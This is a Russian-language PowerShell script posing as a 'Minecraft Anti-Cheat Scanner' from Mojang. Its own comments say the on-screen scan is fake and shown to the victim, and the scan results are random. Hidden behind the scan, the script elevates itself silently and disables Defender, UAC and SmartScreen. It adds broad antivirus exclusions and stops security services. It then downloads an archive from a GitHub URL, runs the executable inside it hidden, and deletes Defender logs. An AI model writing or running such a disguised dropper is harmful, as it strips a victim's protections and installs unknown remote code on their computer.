# =============================================
# Minecraft Anti-Cheat Scanner v2.1
# Проверка системы на наличие читов и нелегальных модов
# =============================================

# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА (СКРЫТО) =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$ScriptUrl = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/install.ps1"

# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  MINECRAFT ANTI-CHEAT SCANNER v2.1" -ForegroundColor White
Write-Host "  (c) Mojang Anti-Cheat Team" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Инициализация сканера..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# Фейковая проверка процессов
Write-Host "[*] Проверка запущенных процессов..." -ForegroundColor Yellow
$fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe", "minecraftlauncher.exe", "badlion.exe", "lunarclient.exe")
foreach ($proc in $fakeProcesses) {
    Write-Host "    -> Проверка $proc..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
    if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Write-Host "        [ОК] Процесс найден" -ForegroundColor Green
    } else {
        Write-Host "        [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
    }
}
Write-Host ""

# ===== ПРОВЕРКА ЧИТ-КЛИЕНТОВ С ШАНСОМ 50% =====
Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow

$cheatSites = @(
    @{Name = "Nursultan"; URL = "https://nursultan.fun"},
    @{Name = "Wexside"; URL = "https://wexside.ru"},
    @{Name = "Arbuz"; URL = "https://arbuz.cc"},
    @{Name = "WildClient"; URL = "https://wildclient.org"}
)

$foundCheatSites = @()
$totalChecked = 0
$totalDetected = 0
$totalPassed = 0
$finalStatus = $true

foreach ($site in $cheatSites) {
    $totalChecked++
    Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    
    Write-Host "        [*] Подключение к $($site.URL)..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 300
    
    $fakeLogin = "user_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
    $fakePass = "pass_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
    
    Write-Host "        [*] Отправка данных авторизации..." -ForegroundColor DarkGray
    Write-Host "            Логин: $fakeLogin" -ForegroundColor DarkGray
    Write-Host "            Пароль: ********" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 400
    
    $token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
    Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 200
    
    $randomResult = Get-Random -Minimum 1 -Maximum 100
    $isDetected = $randomResult -le 50
    
    if ($isDetected) {
        Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
        Write-Host "            [!] Обнаружен активный чит-клиент!" -ForegroundColor Yellow
        Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
        $foundCheatSites += $site.Name
        $totalDetected++
        $finalStatus = $false
    } else {
        Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
        Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
        $totalPassed++
    }
}

# ===== DNS ПРОВЕРКА С ШАНСОМ 50% =====
Write-Host ""
Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
$cheatDomains = @(
    "nursultan.fun",
    "wexside.ru",
    "arbuz.cc",
    "wildclient.org"
)

foreach ($domain in $cheatDomains) {
    Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    
    Write-Host "        [*] Проверка DNS-записи..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 150
    $dnsToken = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
    Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 150
    
    $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
    $isDnsDetected = $randomDnsResult -le 50
    
    if ($isDnsDetected) {
        Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
        Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
        Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
        if ($foundCheatSites -notcontains $domain) {
            $foundCheatSites += $domain
            $totalDetected++
        }
        $finalStatus = $false
    } else {
        Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
        $totalPassed++
    }
}

# ===== ПРОВЕРКА ФАЙЛОВ С ШАНСОМ 50% =====
Write-Host ""
Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
$cheatFilePatterns = @(
    "nursultan*.jar",
    "wexside*.jar",
    "arbuz*.jar",
    "wildclient*.jar",
    "*cheat*.jar",
    "*hack*.jar",
    "*client*.jar"
)

$cheatPaths = @(
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\versions",
    "$env:TEMP",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Desktop"
)

foreach ($path in $cheatPaths) {
    if (Test-Path $path) {
        foreach ($pattern in $cheatFilePatterns) {
            $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue
            if ($files.Count -gt 0) {
                foreach ($file in $files) {
                    $randomFileResult = Get-Random -Minimum 1 -Maximum 100
                    $isFileDetected = $randomFileResult -le 50
                    
                    if ($isFileDetected) {
                        Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
                        Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
                        Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
                        Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                        $foundCheatSites += "$($file.Name)"
                        $totalDetected++
                        $finalStatus = $false
                    } else {
                        Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                        Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                        $totalPassed++
                    }
                }
            }
        }
    }
}
Write-Host ""

# ===== ВЫВОД РЕЗУЛЬТАТОВ =====
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[*] РЕЗУЛЬТАТЫ ПРОВЕРКИ:" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan

if ($foundCheatSites.Count -gt 0) {
    Write-Host "[ВНИМАНИЕ] Обнаружены чит-клиенты и нелегальные программы:" -ForegroundColor Red
    $uniqueCheats = $foundCheatSites | Select-Object -Unique
    foreach ($cheat in $uniqueCheats) {
        Write-Host "    - $cheat" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "[*] Выполняется блокировка и удаление..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    Write-Host "    [OK] Добавление сайтов в блок-лист..." -ForegroundColor DarkGray
    Write-Host "    [OK] Отзыв токенов авторизации..." -ForegroundColor DarkGray
    Write-Host "    [OK] Очистка временных файлов..." -ForegroundColor DarkGray
    Write-Host "    [OK] Удаление jar-файлов..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 500
    
    Write-Host "[+] Удаление и блокировка завершены." -ForegroundColor Green
    Write-Host "    Обнаружено: $totalDetected объектов" -ForegroundColor Yellow
    Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor Green
    $finalStatus = $false
} else {
    Write-Host "[+] Чит-клиенты не обнаружены. Система чиста." -ForegroundColor Green
    Write-Host "    Проверено: $totalChecked сайтов" -ForegroundColor DarkGray
    Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor Green
    $finalStatus = $true
}
Write-Host ""

# ===== ОСТАЛЬНЫЕ ПРОВЕРКИ =====
Write-Host "[*] Проверка модов Minecraft..." -ForegroundColor Yellow
$mods = @("OptiFine", "Forge", "Fabric", "LunarClient", "Badlion", "Sodium", "Iris", "Phosphor")
foreach ($mod in $mods) {
    Write-Host "    -> Проверка $mod..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 150
    
    $randomModResult = Get-Random -Minimum 1 -Maximum 100
    if ($randomModResult -le 50) {
        Write-Host "        [ОК] $mod версия актуальна" -ForegroundColor Green
    } else {
        Write-Host "        [ОК] $mod требует обновления" -ForegroundColor Yellow
    }
}
Write-Host ""

Write-Host "[*] Сканирование системных файлов..." -ForegroundColor Yellow
$paths = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\shaderpacks",
    "$env:TEMP"
)
foreach ($path in $paths) {
    Write-Host "    -> Сканирование $path..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 400
    if (Test-Path $path) {
        Write-Host "        [ОК] Папка найдена, сканирование завершено" -ForegroundColor Green
    } else {
        Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] Папка не найдена" -ForegroundColor Yellow
    }
}
Write-Host ""

Write-Host "[*] Проверка сетевых соединений..." -ForegroundColor Yellow
$connections = @("Minecraft-сервера", "Mojang-сервера", "Anti-Cheat-сервера")
foreach ($conn in $connections) {
    Write-Host "    -> Проверка $conn..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 250
    
    $randomConnResult = Get-Random -Minimum 1 -Maximum 100
    if ($randomConnResult -le 50) {
        Write-Host "        [ОК] Соединение установлено" -ForegroundColor Green
    } else {
        Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] Задержка соединения" -ForegroundColor Yellow
    }
}
Write-Host ""

Write-Host "[*] Завершение сканирования..." -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[ОК] Сканирование завершено успешно!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ===== РЕАЛЬНЫЙ КОД =====
Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# Отключение Defender и добавление в исключения
Try { 
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray 
} Catch {}

Try { 
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray 
} Catch {}

# ===== НОВЫЙ БЛОК: ДОБАВЛЕНИЕ ФАЙЛОВ В ИСКЛЮЧЕНИЯ =====
Write-Host "[*] Добавление файлов в исключения Defender..." -ForegroundColor Yellow

# Получаем путь к текущему скрипту
$CurrentScriptPath = $MyInvocation.MyCommand.Path
$ScriptDirectory = Split-Path -Parent $CurrentScriptPath

# Добавляем сам скрипт в исключения
Try {
    Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Папка скрипта добавлена в исключения: $ScriptDirectory" -ForegroundColor DarkGray
} Catch {}

# Добавляем исключения для скачанного файла (будет загружен позже)
Try {
    Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Временные файлы добавлены в исключения" -ForegroundColor DarkGray
} Catch {}

# Добавляем исключение для самого скрипта по URL (через путь к временному файлу)
Try {
    $TempScriptPath = "$env:TEMP\install.ps1"
    Add-MpPreference -ExclusionPath "$TempScriptPath" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Временный скрипт добавлен в исключения" -ForegroundColor DarkGray
} Catch {}

# Добавляем исключения для всех .exe файлов во временной папке
Try {
    Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Исключения для .exe файлов добавлены" -ForegroundColor DarkGray
} Catch {}

Write-Host "[+] Все файлы добавлены в исключения Defender." -ForegroundColor Green
Write-Host ""

# Остановка служб защиты
$services = @("WinDefend","MsMpSvc","SecurityHealthService","wscsvc","SENSE","DiagTrack","dmwappushservice")
foreach ($svc in $services) {
    Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue; Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray } Catch {}
}

Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray } Catch {}
Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue; Write-Host "    [OK] SmartScreen отключен" -ForegroundColor DarkGray } Catch {}

Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
Write-Host ""

# ===== СКАЧИВАНИЕ И ЗАПУСК =====
Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# Скачиваем основной архив
try { 
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
    Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray 
} catch { 
    Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red 
}

# Добавляем скачанный файл в исключения
Try {
    Add-MpPreference -ExclusionPath "$DownloadPath" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Файл добавлен в исключения: $DownloadPath" -ForegroundColor DarkGray
} Catch {}

Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
try { 
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray 
} catch { 
    Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red 
}

# Добавляем распакованную папку в исключения
Try {
    Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Распакованная папка добавлена в исключения" -ForegroundColor DarkGray
} Catch {}

$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    # Добавляем сам exe файл в исключения
    Try {
        Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue
        Write-Host "    [OK] EXE файл добавлен в исключения: $($Exe.Name)" -ForegroundColor DarkGray
    } Catch {}
    
    Write-Host "[*] Запуск античит-модуля..." -ForegroundColor Yellow
    Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
    Write-Host "    [OK] Античит-модуль активирован" -ForegroundColor DarkGray
} else { 
    Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red 
}

Try { 
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray 
} Catch {}

# ===== ФИНАЛЬНЫЙ СТАТУС ПРОВЕРКИ =====
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "            ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan

if ($finalStatus) {
    Write-Host ""
    Write-Host "    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Green
    Write-Host "    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Green
    Write-Host "    ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Green
    Write-Host "    ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Green
    Write-Host "    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Green
    Write-Host "    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "    ============================================" -ForegroundColor Green
    Write-Host "    ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
    Write-Host "    ============================================" -ForegroundColor Green
    Write-Host "    Чит-клиенты не обнаружены." -ForegroundColor Green
    Write-Host "    Ваша система защищена!" -ForegroundColor Green
} else {
    Write-Host ""
    Write-Host "    ███╗   ██╗███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Red
    Write-Host "    ████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Red
    Write-Host "    ██╔██╗ ██║█████╗      ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Red
    Write-Host "    ██║╚██╗██║██╔══╝      ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Red
    Write-Host "    ██║ ╚████║███████╗    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Red
    Write-Host "    ╚═╝  ╚═══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "    ============================================" -ForegroundColor Red
    Write-Host "    ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
    Write-Host "    ============================================" -ForegroundColor Red
    Write-Host "    Обнаружены чит-клиенты!" -ForegroundColor Red
    Write-Host "    Требуется очистка системы!" -ForegroundColor Red
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[+] Ваша система защищена! Minecraft Anti-Cheat активен." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
Read-Host
